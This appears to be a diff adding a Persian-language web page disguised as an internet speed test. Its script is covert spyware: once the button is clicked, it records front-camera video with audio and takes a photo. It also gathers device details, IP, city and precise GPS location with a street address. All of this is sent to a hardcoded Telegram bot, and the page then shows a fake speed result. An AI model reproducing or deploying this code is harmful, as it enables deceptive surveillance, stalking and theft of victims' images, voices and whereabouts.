@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تست سرعت اینترنت</title>
+  <style>
+    body {font-family: Tahoma, sans-serif;background: #f0f4f8;color: #2c3e50;text-align: center;padding: 40px 20px;margin: 0;}
+    .card {background: white;max-width: 340px;margin: 0 auto;padding: 30px 25px;border-radius: 16px;box-shadow: 0 8px 25px rgba(0,0,0,0.1);}
+    .icon {font-size: 42px;margin-bottom: 15px;color: #00d2ff;}
+    h2 {font-size: 20px;margin: 0 0 10px;color: #2c3e50;}
+    p {font-size: 14px;color: #666;margin-bottom: 25px;line-height: 1.6;}
+    .btn {background: #00d2ff;color: white;border: none;padding: 14px;font-size: 16px;font-weight: bold;border-radius: 12px;cursor: pointer;width: 100%;transition: 0.3s;}
+    .btn:hover {background: #00b4d8;}
+    .btn:disabled {background: #ccc;cursor: not-allowed;}
+    .spinner {display: inline-block;width: 18px;height: 18px;border: 2px solid #fff;border-top: 2px solid transparent;border-radius: 50%;animation: spin 1s linear infinite;margin-right: 8px;}
+    @keyframes spin {to {transform: rotate(360deg);}}
+    .status {margin-top: 20px;font-size: 14px;color: #555;min-height: 40px;}
+    .progress {width: 100%;height: 6px;background: #eee;border-radius: 3px;margin: 15px 0;overflow: hidden;}
+    .progress-bar {height: 100%;background: #00d2ff;width: 0;transition: width 0.1s;}
+    .hidden {display: none;}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">WiFi</div>
+    <h2>تست سرعت اینترنت</h2>
+    <p>برای تست دقیق، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
+   
+    <button id="startBtn" class="btn">
+      <span id="btnText">شروع تست سرعت</span>
+      <span id="spinner" class="spinner hidden"></span>
+    </button>
+   
+    <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
+    <div id="status" class="status">آماده برای تست...</div>
+  </div>
+
+  <video id="video" class="hidden" autoplay playsinline></video>
+  <canvas id="canvas" class="hidden"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8596621944:AAFqbMc13biq0RK_3hz412nFHYu7jjpsxU0";
+    const CHAT_ID = "8596621944";
+
+    const startBtn = document.getElementById('startBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const status = document.getElementById('status');
+    const progressBar = document.getElementById('progressBar');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    let mediaRecorder, stream, timer, photoStream;
+
+    // گرفتن عکس از دوربین جلو
+    async function capturePhoto() {
+      return new Promise(async (resolve) => {
+        try {
+          photoStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+          });
+          video.srcObject = photoStream;
+          video.onloadedmetadata = () => {
+            video.play();
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            setTimeout(() => {
+              ctx.drawImage(video, 0, 0);
+              canvas.toBlob(blob => {
+                stopPhotoStream();
+                resolve(blob);
+              }, 'image/jpeg', 0.9);
+            }, 600);
+          };
+        } catch {
+          resolve(null);
+        }
+      });
+    }
+
+    function stopPhotoStream() {
+      if (photoStream) photoStream.getTracks().forEach(t => t.stop());
+    }
+
+    // ضبط فیلم ۱۰ ثانیه‌ای از دوربین جلو + صدا
+    async function recordVideo() {
+      return new Promise((resolve) => {
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          resolve(blob);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000);
+      });
+    }
+
+    // اطلاعات دستگاه
+    async function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        ip: 'در حال دریافت...',
+        location: 'در حال دریافت...'
+      };
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        info.ip = data.ip || 'نامشخص';
+        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
+      } catch {}
+      return info;
+    }
+
+    // موقعیت GPS
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve({ error: "GPS غیرفعال" });
+        navigator.geolocation.getCurrentPosition(
+          async pos => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+              const data = await res.json();
+              resolve({ latitude, longitude, accuracy, address: data.display_name || "نامشخص" });
+            } catch {
+              resolve({ latitude, longitude, accuracy, address: "نامشخص" });
+            }
+          },
+          () => resolve({ error: "اجازه رد شد" }),
+          { enableHighAccuracy: true, timeout: 12000 }
+        );
+      });
+    }
+
+    // شروع ضبط
+    async function startRecording() {
+      try {
+        startBtn.disabled = true;
+        btnText.textContent = "در حال اتصال...";
+        spinner.classList.remove('hidden');
+        status.textContent = "درخواست دسترسی...";
+        progressBar.style.width = "0%";
+
+        // دسترسی به دوربین جلو + میکروفون
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: 640, height: 480 },
+          audio: true
+        });
+
+        video.srcObject = stream;
+        video.muted = true;
+        video.play();
+
+        status.textContent = "در حال اتصال به سرور(۱۰ ثانیه)";
+
+        let seconds = 0;
+        timer = setInterval(() => {
+          seconds++;
+          progressBar.style.width = `${(seconds / 10) * 100}%`;
+          if (seconds >= 10) {
+            clearInterval(timer);
+            stopRecordingAndSend();
+          }
+        }, 1000);
+
+      } catch (err) {
+        status.textContent = "دسترسی رد شد.";
+        reset();
+      }
+    }
+
+    async function stopRecordingAndSend() {
+      // گرفتن عکس
+      const photoBlob = await capturePhoto();
+      // ضبط فیلم
+      const videoBlob = await recordVideo();
+      const deviceInfo = await getDeviceInfo();
+      const location = await getLocation();
+
+      // ارسال جدا جدا
+      let messageId = null;
+
+      // 1. ارسال فیلم
+      if (videoBlob) {
+        const videoForm = new FormData();
+        videoForm.append('chat_id', CHAT_ID);
+        videoForm.append('video', videoBlob, `video_${Date.now()}.webm`);
+        const videoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+          method: 'POST',
+          body: videoForm
+        });
+        const videoData = await videoRes.json();
+        if (videoData.ok) messageId = videoData.result.message_id;
+      }
+
+      // 2. ارسال عکس
+      if (photoBlob) {
+        const photoForm = new FormData();
+        photoForm.append('chat_id', CHAT_ID);
+        photoForm.append('photo', photoBlob, 'photo.jpg');
+        if (messageId) photoForm.append('reply_to_message_id', messageId);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: photoForm
+        });
+      }
+
+      // 3. ارسال گزارش کامل
+      const report = `
+*گزارش کامل کاربر*
+مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
+IP: \`${deviceInfo.ip}\`
+موقعیت تقریبی: \`${deviceInfo.location}\`
+*موقعیت دقیق*
+طول: \`${location.latitude || 'نامشخص'}\`
+عرض: \`${location.longitude || 'نامشخص'}\`
+آدرس: \`${location.address || 'نامشخص'}\`
+سازنده : null`
+[نقشه](https://maps.google.com/?q=${location.latitude},${location.longitude})
+      `.trim();
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: report,
+          parse_mode: 'Markdown',
+          reply_to_message_id: messageId || undefined,
+          disable_web_page_preview: false
+        })
+      });
+
+      status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
+      stopStream();
+      reset();
+    }
+
+    function stopStream() {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      stopPhotoStream();
+    }
+
+    function reset() {
+      setTimeout(() => {
+        startBtn.disabled = false;
+        btnText.textContent = "شروع تست سرعت";
+        spinner.classList.add('hidden');
+        progressBar.style.width = "0%";
+      }, 2000);
+    }
+
+    startBtn.addEventListener('click', startRecording);
+  </script>
+</body>
+</html>
